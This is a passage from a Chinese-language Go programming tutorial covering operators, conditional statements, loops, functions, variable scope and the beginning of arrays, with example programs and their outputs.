fmt.Printf(&quot;第五行 - c 的值为 %d\\n&quot;, c )&#125;\n\n以上实例运行结果：\n第一行 - c 的值为 12第二行 - c 的值为 61第三行 - c 的值为 49第四行 - c 的值为 240第五行 - c 的值为 15\n\n赋值运算符下表列出了所有Go语言的赋值运算符。\n\n\n\n运算符\n描述\n实例\n\n\n\n&#x3D;\n简单的赋值运算符，将一个表达式的值赋给一个左值\nC &#x3D; A + B 将 A + B 表达式结果赋值给 C\n\n\n+&#x3D;\n相加后再赋值\nC +&#x3D; A 等于 C &#x3D; C + A\n\n\n-&#x3D;\n相减后再赋值\nC -&#x3D; A 等于 C &#x3D; C - A\n\n\n*&#x3D;\n相乘后再赋值\nC *&#x3D; A 等于 C &#x3D; C * A\n\n\n&#x2F;&#x3D;\n相除后再赋值\nC &#x2F;&#x3D; A 等于 C &#x3D; C &#x2F; A\n\n\n%&#x3D;\n求余后再赋值\nC %&#x3D; A 等于 C &#x3D; C % A\n\n\n&lt;&lt;&#x3D;\n左移后赋值\nC &lt;&lt;&#x3D; 2 等于 C &#x3D; C &lt;&lt; 2\n\n\n&gt;&gt;&#x3D;\n右移后赋值\nC &gt;&gt;&#x3D; 2 等于 C &#x3D; C &gt;&gt; 2\n\n\n&amp;&#x3D;\n按位与后赋值\nC &amp;&#x3D; 2 等于 C &#x3D; C &amp; 2\n\n\n^&#x3D;\n按位异或后赋值\nC ^&#x3D; 2 等于 C &#x3D; C ^ 2\n\n\n|&#x3D;\n按位或后赋值\nC |&#x3D; 2 等于 C &#x3D; C | 2\n\n\n以下实例演示了赋值运算符的用法：\npackage mainimport &quot;fmt&quot;func main() &#123;   var a int = 21   var c int   c =  a   fmt.Printf(&quot;第 1 行 - =  运算符实例，c 值为 = %d\\n&quot;, c )   c +=  a   fmt.Printf(&quot;第 2 行 - += 运算符实例，c 值为 = %d\\n&quot;, c )   c -=  a   fmt.Printf(&quot;第 3 行 - -= 运算符实例，c 值为 = %d\\n&quot;, c )   c *=  a   fmt.Printf(&quot;第 4 行 - *= 运算符实例，c 值为 = %d\\n&quot;, c )   c /=  a   fmt.Printf(&quot;第 5 行 - /= 运算符实例，c 值为 = %d\\n&quot;, c )   c  = 200;   c &lt;&lt;=  2   fmt.Printf(&quot;第 6行  - &lt;&lt;= 运算符实例，c 值为 = %d\\n&quot;, c )   c &gt;&gt;=  2   fmt.Printf(&quot;第 7 行 - &gt;&gt;= 运算符实例，c 值为 = %d\\n&quot;, c )   c &amp;=  2   fmt.Printf(&quot;第 8 行 - &amp;= 运算符实例，c 值为 = %d\\n&quot;, c )   c ^=  2   fmt.Printf(&quot;第 9 行 - ^= 运算符实例，c 值为 = %d\\n&quot;, c )   c |=  2   fmt.Printf(&quot;第 10 行 - |= 运算符实例，c 值为 = %d\\n&quot;, c )&#125;\n\n以上实例运行结果：\n第 1 行 - =  运算符实例，c 值为 = 21第 2 行 - += 运算符实例，c 值为 = 42第 3 行 - -= 运算符实例，c 值为 = 21第 4 行 - *= 运算符实例，c 值为 = 441第 5 行 - /= 运算符实例，c 值为 = 21第 6行  - &lt;&lt;= 运算符实例，c 值为 = 800第 7 行 - &gt;&gt;= 运算符实例，c 值为 = 200第 8 行 - &amp;= 运算符实例，c 值为 = 0第 9 行 - ^= 运算符实例，c 值为 = 2第 10 行 - |= 运算符实例，c 值为 = 2\n\n其他运算符下表列出了Go语言的其他运算符。\n\n\n\n运算符\n描述\n实例\n\n\n\n&amp;\n返回变量存储地址\n&amp;a; 将给出变量的实际地址。\n\n\n*\n指针变量。\n*a; 是一个指针变量\n\n\n以下实例演示了其他运算符的用法：\npackage mainimport &quot;fmt&quot;func main() &#123;   var a int = 4   var b int32   var c float32   var ptr *int   /* 运算符实例 */   fmt.Printf(&quot;第 1 行 - a 变量类型为 = %T\\n&quot;, a );   fmt.Printf(&quot;第 2 行 - b 变量类型为 = %T\\n&quot;, b );   fmt.Printf(&quot;第 3 行 - c 变量类型为 = %T\\n&quot;, c );   /*  &amp; 和 * 运算符实例 */   ptr = &amp;a     /* &#x27;ptr&#x27; 包含了 &#x27;a&#x27; 变量的地址 */   fmt.Printf(&quot;a 的值为  %d\\n&quot;, a);   fmt.Printf(&quot;*ptr 为 %d\\n&quot;, *ptr);&#125;\n\n以上实例运行结果：\n第 1 行 - a 变量类型为 = int第 2 行 - b 变量类型为 = int32第 3 行 - c 变量类型为 = float32a 的值为  4*ptr 为 4\n\n运算符优先级有些运算符拥有较高的优先级，二元运算符的运算方向均是从左至右。下表列出了所有运算符以及它们的优先级，由上至下代表优先级由高到低：\n\n\n\n优先级\n运算符\n\n\n\n5\n* &#x2F; % &lt;&lt; &gt;&gt; &amp; &amp;^\n\n\n4\n+ - | ^\n\n\n3\n&#x3D;&#x3D; !&#x3D; &lt; &lt;&#x3D; &gt; &gt;&#x3D;\n\n\n2\n&amp;&amp;\n\n\n1\n||\n\n\n当然，你可以通过使用括号来临时提升某个表达式的整体运算优先级。\n以上实例运行结果：\npackage mainimport &quot;fmt&quot;func main() &#123;   var a int = 20   var b int = 10   var c int = 15   var d int = 5   var e int;   e = (a + b) * c / d;      // ( 30 * 15 ) / 5   fmt.Printf(&quot;(a + b) * c / d 的值为 : %d\\n&quot;,  e );   e = ((a + b) * c) / d;    // (30 * 15 ) / 5   fmt.Printf(&quot;((a + b) * c) / d 的值为  : %d\\n&quot; ,  e );   e = (a + b) * (c / d);   // (30) * (15/5)   fmt.Printf(&quot;(a + b) * (c / d) 的值为  : %d\\n&quot;,  e );   e = a + (b * c) / d;     //  20 + (150/5)   fmt.Printf(&quot;a + (b * c) / d 的值为  : %d\\n&quot; ,  e );  &#125;\n\n以上实例运行结果：\n(a + b) * c / d 的值为 : 90((a + b) * c) / d 的值为  : 90(a + b) * (c / d) 的值为  : 90a + (b * c) / d 的值为  : 50\n\n\n\n0x07 Go 语言条件语句条件语句需要开发者通过指定一个或多个条件，并通过测试条件是否为 true 来决定是否执行指定语句，并在条件为 false 的情况在执行另外的语句。\n下图展示了程序语言中条件语句的结构：\n\nGo 语言提供了以下几种条件判断语句：\n\n\n\n语句\n描述\n\n\n\nif 语句\nif 语句 由一个布尔表达式后紧跟一个或多个语句组成。\n\n\nif…else 语句\nif 语句 后可以使用可选的 else 语句, else 语句中的表达式在布尔表达式为 false 时执行。\n\n\nif 嵌套语句\n你可以在 if 或 else if 语句中嵌入一个或多个 if 或 else if 语句。\n\n\nswitch 语句\nswitch 语句用于基于不同条件执行不同动作。\n\n\nselect 语句\nselect 语句类似于 switch 语句，但是select会随机执行一个可运行的case。如果没有case可运行，它将阻塞，直到有case可运行。\n\n\n\n注意：Go 没有三目运算符，所以不支持 ?: 形式的条件判断。\n\nGo 语言 if 语句if 语句由布尔表达式后紧跟一个或多个语句组成。\n语法Go 编程语言中 if 语句的语法如下：\nif 布尔表达式 &#123;   /* 在布尔表达式为 true 时执行 */&#125;\n\nIf 在布尔表达式为 true 时，其后紧跟的语句块执行，如果为 false 则不执行。\n流程图如下：\n\n实例使用 if 判断一个数\b变量的大小：\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 定义局部变量 */   var a int = 10    /* 使用 if 语句判断布尔表达式 */   if a &lt; 20 &#123;       /* 如果条件为 true 则执行以下语句 */       fmt.Printf(&quot;a 小于 20\\n&quot; )   &#125;   fmt.Printf(&quot;a 的值为 : %d\\n&quot;, a)&#125;\n\n以上代码执行结果为：\na 小于 20a 的值为 : 10\n\n\n\nGo 语言 if…else 语句if 语句 后可以使用可选的 else 语句, else 语句中的表达式在布尔表达式为 false 时执行。\n语法Go 编程语言中 if…else 语句的语法如下：\nif 布尔表达式 &#123;   /* 在布尔表达式为 true 时执行 */&#125; else &#123;  /* 在布尔表达式为 false 时执行 */&#125;\n\nIf 在布尔表达式为 true 时，其后紧跟的语句块执行，如果为 false 则执行 else 语句块。\n流程图如下：\n\n实例使用 if else 判断一个数的大小：\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 局部变量定义 */   var a int = 100;    /* 判断布尔表达式 */   if a &lt; 20 &#123;       /* 如果条件为 true 则执行以下语句 */       fmt.Printf(&quot;a 小于 20\\n&quot; );   &#125; else &#123;       /* 如果条件为 false 则执行以下语句 */       fmt.Printf(&quot;a 不小于 20\\n&quot; );   &#125;   fmt.Printf(&quot;a 的值为 : %d\\n&quot;, a);&#125;\n\n以上代码执行结果为：\na 不小于 20a 的值为 : 100\n\nGo 语言 if 语句嵌套你可以在 if 或 else if 语句中嵌入一个或多个 if 或 else if 语句。\n语法Go 编程语言中 if…else 语句的语法如下：\nif 布尔表达式 1 &#123;   /* 在布尔表达式 1 为 true 时执行 */   if 布尔表达式 2 &#123;      /* 在布尔表达式 2 为 true 时执行 */   &#125;&#125;\n\n你可以以同样的方式在 if 语句中嵌套 else if…else 语句\n实例嵌套使用 if 语句：\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 定义局部变量 */   var a int = 100   var b int = 200    /* 判断条件 */   if a == 100 &#123;       /* if 条件语句为 true 执行 */       if b == 200 &#123;          /* if 条件语句为 true 执行 */          fmt.Printf(&quot;a 的值为 100 ， b 的值为 200\\n&quot; );       &#125;   &#125;   fmt.Printf(&quot;a 值为 : %d\\n&quot;, a );   fmt.Printf(&quot;b 值为 : %d\\n&quot;, b );&#125;\n\n以上代码执行结果为：\na 的值为 100 ， b 的值为 200a 值为 : 100b 值为 : 200\n\n\n\nGo 语言 switch 语句switch 语句用于基于不同条件执行不同动作，每一个 case 分支都是唯一的，从上至下逐一测试，直到匹配为止。\nswitch 语句执行的过程从上至下，直到找到匹配项，匹配项后面也不需要再加 break。\nswitch 默认情况下 case 最后自带 break 语句，匹配成功后就不会执行其他 case，如果我们需要执行后面的 case，可以使用 fallthrough 。\n语法Go 编程语言中 switch 语句的语法如下：\nswitch var1 &#123;    case val1:        ...    case val2:        ...    default:        ...&#125;\n\n变量 var1 可以是任何类型，而 val1 和 val2 则可以是同类型的任意值。类型不被局限于常量或整数，但必须是相同的类型；或者最终结果为相同类型的表达式。\n您可以同时测试多个可能符合条件的值，使用逗号分割它们，例如：case val1, val2, val3。\n流程图：\n\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 定义局部变量 */   var grade string = &quot;B&quot;   var marks int = 90   switch marks &#123;      case 90: grade = &quot;A&quot;      case 80: grade = &quot;B&quot;      case 50,60,70 : grade = &quot;C&quot;      default: grade = &quot;D&quot;     &#125;   switch &#123;      case grade == &quot;A&quot; :         fmt.Printf(&quot;优秀!\\n&quot; )          case grade == &quot;B&quot;, grade == &quot;C&quot; :         fmt.Printf(&quot;良好\\n&quot; )            case grade == &quot;D&quot; :         fmt.Printf(&quot;及格\\n&quot; )            case grade == &quot;F&quot;:         fmt.Printf(&quot;不及格\\n&quot; )      default:         fmt.Printf(&quot;差\\n&quot; );   &#125;   fmt.Printf(&quot;你的等级是 %s\\n&quot;, grade );      &#125;\n\n以上代码执行结果为：\n优秀!你的等级是 A\n\n\nType Switchswitch 语句还可以被用于 type-switch 来判断某个 interface 变量中实际存储的变量类型。\nType Switch 语法格式如下：\nswitch x.(type)&#123;    case type:       statement(s);          case type:       statement(s);     /* 你可以定义任意个数的case */    default: /* 可选 */       statement(s);&#125;\n\n\n\npackage mainimport &quot;fmt&quot;func main() &#123;   var x interface&#123;&#125;        switch i := x.(type) &#123;      case nil:           fmt.Printf(&quot; x 的类型 :%T&quot;,i)                      case int:           fmt.Printf(&quot;x 是 int 型&quot;)                            case float64:         fmt.Printf(&quot;x 是 float64 型&quot;)                case func(int) float64:         fmt.Printf(&quot;x 是 func(int) 型&quot;)                            case bool, string:         fmt.Printf(&quot;x 是 bool 或 string 型&quot; )            default:         fmt.Printf(&quot;未知型&quot;)       &#125;  &#125;\n\n以上代码执行结果为：\nx 的类型 :&lt;nil&gt;\n\nfallthrough使用 fallthrough 会强制执行后面的 case 语句，fallthrough 不会判断下一条 case 的表达式结果是否为 true。\npackage mainimport &quot;fmt&quot;func main() &#123;    switch &#123;    case false:            fmt.Println(&quot;1、case 条件语句为 false&quot;)            fallthrough    case true:            fmt.Println(&quot;2、case 条件语句为 true&quot;)            fallthrough    case false:            fmt.Println(&quot;3、case 条件语句为 false&quot;)            fallthrough    case true:            fmt.Println(&quot;4、case 条件语句为 true&quot;)    case false:            fmt.Println(&quot;5、case 条件语句为 false&quot;)            fallthrough    default:            fmt.Println(&quot;6、默认 case&quot;)    &#125;&#125;\n\n以上代码执行结果为：\n2、case 条件语句为 true3、case 条件语句为 false4、case 条件语句为 true\n\n从以上代码输出的结果可以看出：switch 从第一个判断表达式为 true 的 case 开始执行，如果 case 带有 fallthrough，程序会继续执行下一条 case，且它不会去判断下一个 case 的表达式是否为 true。\nGo 语言 select 语句select 是 Go 中的一个控制结构，类似于用于通信的 switch 语句。每个 case 必须是一个通信操作，要么是发送要么是接收。\nselect 随机执行一个可运行的 case。如果没有 case 可运行，它将阻塞，直到有 case 可运行。一个默认的子句应该总是可运行的。\n语法Go 编程语言中 select 语句的语法如下：\nselect &#123;    case communication clause  :       statement(s);          case communication clause  :       statement(s);    /* 你可以定义任意数量的 case */    default : /* 可选 */       statement(s);&#125;\n\n以下描述了 select 语句的语法：\n\n每个 case 都必须是一个通信\n\n所有 channel 表达式都会被求值\n\n所有被发送的表达式都会被求值\n\n如果任意某个通信可以进行，它就执行，其他被忽略。\n\n如果有多个 case 都可以运行，Select 会随机公平地选出一个执行。其他不会执行。\n否则：\n\n如果有 default 子句，则执行该语句。\n如果没有 default 子句，select 将阻塞，直到某个通信可以运行；Go 不会重新对 channel 或值进行求值。\n\n\n\n实例select 语句应用演示：\npackage mainimport &quot;fmt&quot;func main() &#123;   var c1, c2, c3 chan int   var i1, i2 int   select &#123;      case i1 = &lt;-c1:         fmt.Printf(&quot;received &quot;, i1, &quot; from c1\\n&quot;)      case c2 &lt;- i2:         fmt.Printf(&quot;sent &quot;, i2, &quot; to c2\\n&quot;)      case i3, ok := (&lt;-c3):  // same as: i3, ok := &lt;-c3         if ok &#123;            fmt.Printf(&quot;received &quot;, i3, &quot; from c3\\n&quot;)         &#125; else &#123;            fmt.Printf(&quot;c3 is closed\\n&quot;)         &#125;      default:         fmt.Printf(&quot;no communication\\n&quot;)   &#125;    &#125;\n\n以上代码执行结果为：\nno communication\n\n\n\n\n\n0x08 Go 语言循环语句在不少实际问题中有许多具有规律性的重复操作，因此在程序中就需要重复执行某些语句。\n以下为大多编程语言循环程序的流程图：\n\nGo 语言提供了以下几种类型循环处理语句：\n\n\n\n循环类型\n描述\n\n\n\nfor 循环\n重复执行语句块\n\n\n循环嵌套\n在 for 循环中嵌套一个或多个 for 循环\n\n\n\n循环控制语句循环控制语句可以控制循环体内语句的执行过程。\nGO 语言支持以下几种循环控制语句：\n\n\n\n控制语句\n描述\n\n\n\nbreak 语句\n经常用于中断当前 for 循环或跳出 switch 语句\n\n\ncontinue 语句\n跳过当前循环的剩余语句，然后继续进行下一轮循环。\n\n\ngoto 语句\n将控制转移到被标记的语句。\n\n\n\n无限循环如果循环中条件语句永远不为 false 则会进行无限循环，我们可以通过 for 循环语句中只设置一个条件表达式来执行无限循环：\npackage mainimport &quot;fmt&quot;func main() &#123;    for true  &#123;        fmt.Printf(&quot;这是无限循环。\\n&quot;);    &#125;&#125;\n\n\n\n\n\n\n\nGo 语言 for 循环for 循环是一个循环控制结构，可以执行指定次数的循环。\n语法Go 语言的 For 循环有 3 种形式，只有其中的一种使用分号。\n和 C 语言的 for 一样：\nfor init; condition; post &#123; &#125;\n\n和 C 的 while 一样：\nfor condition &#123; &#125;\n\n和 C 的 for(;;) 一样：\nfor &#123; &#125;\n\n\ninit： 一般为赋值表达式，给控制变量赋初值；\ncondition： 关系表达式或逻辑表达式，循环控制条件；\npost： 一般为赋值表达式，给控制变量增量或减量。\n\nfor语句执行过程如下：\n\n1、先对表达式 1 赋初值；\n2、判别赋值表达式 init 是否满足给定条件，若其值为真，满足循环条件，则执行循环体内语句，然后执行 post，进入第二次循环，再判别 condition；否则判断 condition 的值为假，不满足条件，就终止for循环，执行循环体外语句。\n\nfor 循环的 range 格式可以对 slice、map、数组、字符串等进行迭代循环。格式如下：\nfor key, value := range oldMap &#123;    newMap[key] = value&#125;\n\nfor 语句语法流程如下图所示：\n\n计算 1 到 10 的数字之和：\npackage mainimport &quot;fmt&quot;func main() &#123;        sum := 0        for i := 0; i &lt;= 10; i++ &#123;                sum += i        &#125;        fmt.Println(sum)&#125;\n\n输出结果为：\n55\n\ninit 和 post 参数是可选的，我们可以直接省略它，类似 While 语句。\n以下实例在 sum 小于 10 的时候计算 sum 自相加后的值：\npackage mainimport &quot;fmt&quot;func main() &#123;        sum := 1        for ; sum &lt;= 10; &#123;                sum += sum        &#125;        fmt.Println(sum)        // 这样写也可以，更像 While 语句形式        for sum &lt;= 10&#123;                sum += sum        &#125;        fmt.Println(sum)&#125;\n\n输出结果为：\n1616\n\n无限循环:\npackage mainimport &quot;fmt&quot;func main() &#123;        sum := 0        for &#123;            sum++ // 无限循环下去        &#125;        fmt.Println(sum) // 无法输出&#125;\n\n要停止无限循环，可以在命令窗口按下ctrl-c 。\nFor-each range 循环\n这种格式的循环可以对字符串、数组、切片等进行迭代输出元素。\npackage mainimport &quot;fmt&quot;func main() &#123;        strings := []string&#123;&quot;google&quot;, &quot;runoob&quot;&#125;        for i, s := range strings &#123;                fmt.Println(i, s)        &#125;        numbers := [6]int&#123;1, 2, 3, 5&#125;        for i,x:= range numbers &#123;                fmt.Printf(&quot;第 %d 位 x 的值 = %d\\n&quot;, i,x)        &#125;  &#125;\n\n以上实例运行输出结果为:\n0 google1 runoob第 0 位 x 的值 = 1第 1 位 x 的值 = 2第 2 位 x 的值 = 3第 3 位 x 的值 = 5第 4 位 x 的值 = 0第 5 位 x 的值 = 0\n\n\n\n\n\n0x09 Go 语言函数函数是基本的代码块，用于执行一个任务。\nGo 语言最少有个 main() 函数。\n你可以通过函数来划分不同功能，逻辑上每个函数执行的是指定的任务。\n函数声明告诉了编译器函数的名称，返回类型，和参数。\nGo 语言标准库提供了多种可动用的内置的函数。例如，len() 函数可以接受不同类型参数并返回该类型的长度。如果我们传入的是字符串则返回字符串的长度，如果传入的是数组，则返回数组中包含的元素个数。\n\n函数定义Go 语言函数定义格式如下：\nfunc function_name( [parameter list] ) [return_types] &#123;   函数体&#125;\n\n函数定义解析：\n\nfunc：函数由 func 开始声明\nfunction_name：函数名称，函数名和参数列表一起构成了函数签名。\nparameter list：参数列表，参数就像一个占位符，当函数被调用时，你可以将值传递给参数，这个值被称为实际参数。参数列表指定的是参数类型、顺序、及参数个数。参数是可选的，也就是说函数也可以不包含参数。\nreturn_types：返回类型，函数返回一列值。return_types 是该列值的数据类型。有些功能不需要返回值，这种情况下 return_types 不是必须的。\n函数体：函数定义的代码集合。\n\n以下实例为 max() 函数的代码，该函数传入两个整型参数 num1 和 num2，并返回这两个参数的最大值：\n/* 函数返回两个数的最大值 */func max(num1, num2 int) int &#123;   /* 声明局部变量 */   var result int   if (num1 &gt; num2) &#123;      result = num1   &#125; else &#123;      result = num2   &#125;   return result&#125;\n\n函数调用当创建函数时，你定义了函数需要做什么，通过调用该函数来执行指定任务。\n调用函数，向函数传递参数，并返回值，例如：\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 定义局部变量 */   var a int = 100   var b int = 200   var ret int   /* 调用函数并返回最大值 */   ret = max(a, b)   fmt.Printf( &quot;最大值是 : %d\\n&quot;, ret )&#125;/* 函数返回两个数的最大值 */func max(num1, num2 int) int &#123;   /* 定义局部变量 */   var result int   if (num1 &gt; num2) &#123;      result = num1   &#125; else &#123;      result = num2   &#125;   return result&#125;\n\n以上实例在 main() 函数中调用 max（）函数，执行结果为：\n最大值是 : 200\n\n函数返回多个值Go 函数可以返回多个值，例如：\npackage mainimport &quot;fmt&quot;func swap(x, y string) (string, string) &#123;   return y, x&#125;func main() &#123;   a, b := swap(&quot;Google&quot;, &quot;Runoob&quot;)   fmt.Println(a, b)&#125;\n\n以上实例执行结果为：\nRunoob Google\n\n\n函数参数函数如果使用参数，该变量可称为函数的形参。\n形参就像定义在函数体内的局部变量。\n调用函数，可以通过两种方式来传递参数：\n\n\n\n传递类型\n描述\n\n\n\n值传递\n值传递是指在调用函数时将实际参数复制一份传递到函数中，这样在函数中如果对参数进行修改，将不会影响到实际参数。\n\n\n引用传递\n引用传递是指在调用函数时将实际参数的地址传递到函数中，那么在函数中对参数所进行的修改，将影响到实际参数。\n\n\n默认情况下，Go 语言使用的是值传递，即在调用过程中不会影响到实际参数。\n\n函数用法\n\n\n函数用法\n描述\n\n\n\n函数作为另外一个函数的实参\n函数定义后可作为另外一个函数的实参数传入\n\n\n闭包\n闭包是匿名函数，可在动态编程中使用\n\n\n方法\n方法就是一个包含了接受者的函数\n\n\nGo 语言函数值传递值传递是指在调用函数时将实际参数复制一份传递到函数中，这样在函数中如果对参数进行修改，将不会影响到实际参数。\n默认情况下，Go 语言使用的是值传递，即在调用过程中不会影响到实际参数。\n以下定义了 swap() 函数：\n/* 定义相互交换值的函数 */func swap(x, y int) int &#123;   var temp int   temp = x /* 保存 x 的值 */   x = y    /* 将 y 值赋给 x */   y = temp /* 将 temp 值赋给 y*/   return temp;&#125;\n\n接下来，让我们使用值传递来调用 swap() 函数：\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 定义局部变量 */   var a int = 100   var b int = 200   fmt.Printf(&quot;交换前 a 的值为 : %d\\n&quot;, a )   fmt.Printf(&quot;交换前 b 的值为 : %d\\n&quot;, b )   /* 通过调用函数来交换值 */   swap(a, b)   fmt.Printf(&quot;交换后 a 的值 : %d\\n&quot;, a )   fmt.Printf(&quot;交换后 b 的值 : %d\\n&quot;, b )&#125;/* 定义相互交换值的函数 */func swap(x, y int) int &#123;   var temp int   temp = x /* 保存 x 的值 */   x = y    /* 将 y 值赋给 x */   y = temp /* 将 temp 值赋给 y*/   return temp;&#125;\n\n以下代码执行结果为：\n交换前 a 的值为 : 100交换前 b 的值为 : 200交换后 a 的值 : 100交换后 b 的值 : 200\n\n程序中使用的是值传递, 所以两个值并没有实现交互，我们可以使用引用传递 来实现交换效果。\nGo 语言函数引用传递值引用传递是指在调用函数时将实际参数的地址传递到函数中，那么在函数中对参数所进行的修改，将影响到实际参数。\n引用传递指针参数传递到函数内，以下是交换函数 swap() 使用了引用传递：\n/* 定义交换值函数*/func swap(x *int, y *int) &#123;   var temp int   temp = *x    /* 保持 x 地址上的值 */   *x = *y      /* 将 y 值赋给 x */   *y = temp    /* 将 temp 值赋给 y */&#125;\n\n以下我们通过使用引用传递来调用 swap() 函数：\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 定义局部变量 */   var a int = 100   var b int= 200   fmt.Printf(&quot;交换前，a 的值 : %d\\n&quot;, a )   fmt.Printf(&quot;交换前，b 的值 : %d\\n&quot;, b )   /* 调用 swap() 函数   * &amp;a 指向 a 指针，a 变量的地址   * &amp;b 指向 b 指针，b 变量的地址   */   swap(&amp;a, &amp;b)   fmt.Printf(&quot;交换后，a 的值 : %d\\n&quot;, a )   fmt.Printf(&quot;交换后，b 的值 : %d\\n&quot;, b )&#125;func swap(x *int, y *int) &#123;   var temp int   temp = *x    /* 保存 x 地址上的值 */   *x = *y      /* 将 y 值赋给 x */   *y = temp    /* 将 temp 值赋给 y */&#125;\n\n以上代码执行结果为：\n交换前，a 的值 : 100交换前，b 的值 : 200交换后，a 的值 : 200交换后，b 的值 : 100\n\n\n\nGo 语言函数作为实参Go 语言可以很灵活的创建函数，并作为另外一个函数的实参。以下实例中我们在定义的函数中初始化一个变量，该函数仅仅是为了使用内置函数 **math.sqrt()**，实例为：\npackage mainimport (   &quot;fmt&quot;   &quot;math&quot;)func main()&#123;   /* 声明函数变量 */   getSquareRoot := func(x float64) float64 &#123;      return math.Sqrt(x)   &#125;   /* 使用函数 */   fmt.Println(getSquareRoot(9))&#125;\n\n以上代码执行结果为：\n3\n\n\n\nGo 语言函数闭包Go 语言支持匿名函数，可作为闭包。匿名函数是一个”内联”语句或表达式。匿名函数的优越性在于可以直接使用函数内的变量，不必申明。\n以下实例中，我们创建了函数 getSequence() ，返回另外一个函数。该函数的目的是在闭包中递增 i 变量，代码如下：\npackage mainimport &quot;fmt&quot;func getSequence() func() int &#123;   i:=0   return func() int &#123;      i+=1     return i     &#125;&#125;func main()&#123;   /* nextNumber 为一个函数，函数 i 为 0 */   nextNumber := getSequence()     /* 调用 nextNumber 函数，i 变量自增 1 并返回 */   fmt.Println(nextNumber())   fmt.Println(nextNumber())   fmt.Println(nextNumber())      /* 创建新的函数 nextNumber1，并查看结果 */   nextNumber1 := getSequence()     fmt.Println(nextNumber1())   fmt.Println(nextNumber1())&#125;\n\n以上代码执行结果为：\n12312\n\n\n\nGo 语言函数方法Go 语言中同时有函数和方法。一个方法就是一个包含了接受者的函数，接受者可以是命名类型或者结构体类型的一个值或者是一个指针。所有给定类型的方法属于该类型的方法集。语法格式如下：\nfunc (variable_name variable_data_type) function_name() [return_type]&#123;   /* 函数体*/&#125;\n\n下面定义一个结构体类型和该类型的一个方法：\npackage mainimport (   &quot;fmt&quot;  )/* 定义结构体 */type Circle struct &#123;  radius float64&#125;func main() &#123;  var c1 Circle  c1.radius = 10.00  fmt.Println(&quot;圆的面积 = &quot;, c1.getArea())&#125;//该 method 属于 Circle 类型对象中的方法func (c Circle) getArea() float64 &#123;  //c.radius 即为 Circle 类型对象中的属性  return 3.14 * c.radius * c.radius&#125;\n\n以上代码执行结果为：\n圆的面积 =  314\n\n\n\n0x0A Go 语言变量作用域作用域为已声明标识符所表示的常量、类型、变量、函数或包在源代码中的作用范围。\nGo 语言中变量可以在三个地方声明：\n\n函数内定义的变量称为局部变量\n函数外定义的变量称为全局变量\n函数定义中的变量称为形式参数\n\n接下来让我们具体了解局部变量、全局变量和形式参数。\n\n局部变量在函数体内声明的变量称之为局部变量，它们的作用域只在函数体内，参数和返回值变量也是局部变量。\n以下实例中 main() 函数使用了局部变量 a, b, c：\npackage mainimport &quot;fmt&quot;func main() &#123;   /* 声明局部变量 */   var a, b, c int   /* 初始化参数 */   a = 10   b = 20   c = a + b   fmt.Printf (&quot;结果： a = %d, b = %d and c = %d\\n&quot;, a, b, c)&#125;\n\n以上实例执行输出结果为：\n结果： a = 10, b = 20 and c = 30\n\n\n全局变量在函数体外声明的变量称之为全局变量，全局变量可以在整个包甚至外部包（被导出后）使用。\n全局变量可以在任何函数中使用，以下实例演示了如何使用全局变量：\npackage mainimport &quot;fmt&quot;/* 声明全局变量 */var g intfunc main() &#123;   /* 声明局部变量 */   var a, b int   /* 初始化参数 */   a = 10   b = 20   g = a + b   fmt.Printf(&quot;结果： a = %d, b = %d and g = %d\\n&quot;, a, b, g)&#125;\n\n以上实例执行输出结果为：\n结果： a = 10, b = 20 and g = 30\n\nGo 语言程序中全局变量与局部变量名称可以相同，但是函数内的局部变量会被优先考虑。实例如下：\npackage mainimport &quot;fmt&quot;/* 声明全局变量 */var g int = 20func main() &#123;   /* 声明局部变量 */   var g int = 10   fmt.Printf (&quot;结果： g = %d\\n&quot;,  g)&#125;\n\n以上实例执行输出结果为：\n结果： g = 10\n\n\n形式参数形式参数会作为函数的局部变量来使用。实例如下：\npackage mainimport &quot;fmt&quot;/* 声明全局变量 */var a int = 20;func main() &#123;   /* main 函数中声明局部变量 */   var a int = 10   var b int = 20   var c int = 0   fmt.Printf(&quot;main()函数中 a = %d\\n&quot;,  a);   c = sum( a, b);   fmt.Printf(&quot;main()函数中 c = %d\\n&quot;,  c);&#125;/* 函数定义-两数相加 */func sum(a, b int) int &#123;   fmt.Printf(&quot;sum() 函数中 a = %d\\n&quot;,  a);   fmt.Printf(&quot;sum() 函数中 b = %d\\n&quot;,  b);   return a + b;&#125;\n\n以上实例执行输出结果为：\nmain()函数中 a = 10sum() 函数中 a = 10sum() 函数中 b = 20main()函数中 c = 30\n\n\n初始化局部和全局变量不同类型的局部和全局变量默认值为：\n\n\n\n数据类型\n初始化默认值\n\n\n\nint\n0\n\n\nfloat32\n0\n\n\npointer\nnil\n\n\n0x0B Go 语言数组Go 语言提供了数组类型的数据结构。\n数组是具有相同唯一类型的一组已编号且长度固定的数据项序列，这种类型可以是任意的原始类型例如整型、字符串或者自定义类型。\n相对于去声明 number0, number1, …, number99 的变量，使用数组形式 numbers[0], numbers[1] …, numbers[99] 更加方便且易于扩展。\n数组元素可以通过索引（位置）来读取（或者修改），索引从 0 开始，第一个元素索引为 0，第二个索引为 1，以此类推。\n\n\n声明数组Go 语言数组声明需要指定元素类型及元素个数，语法格式如下：\nvar variable_name [SIZE] variable_type\n\n以上为一维数组的定义方式。例如以下定义了数组 balance 长度为 10 类型为 float32：\nvar balance [10] float32\n\n\n初始化数组以下演示了数组初始化：\nvar balance = [5]float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125;\n\n我们也可以通过字面量在声明数组的同时快速初始化数组：\nbalance := [5]float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125;\n\n如果数组长度不确定，可以使用 … 代替数组的长度，编译器会根据元素个数自行推断数组的长度：\nvar balance = [...]float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125;或balance := [...]float32&#123;1000.0, 2.0, 3.4, 7.0, 50.0&#125;\n\n如果设置了数组的长度，我们还可以通过指定下标来初始化元素：\n//  将索引为 1 和 3 的元素初始化balance := [5]float32&#123;1:2.0,3:7.0&#125;\n\n初始化数组中 {} 中的元素个数不能大于 [] 中的数字。\n如果忽略 [] 中的数字不设置数组大小，Go 语言会根据元素的个数来设置数组的大小：\nbalance[4] = 50.0\n\n以上实例读取了第五个元素。数组元素可以通过索引（位置）来读取（或者修改），索引从 0 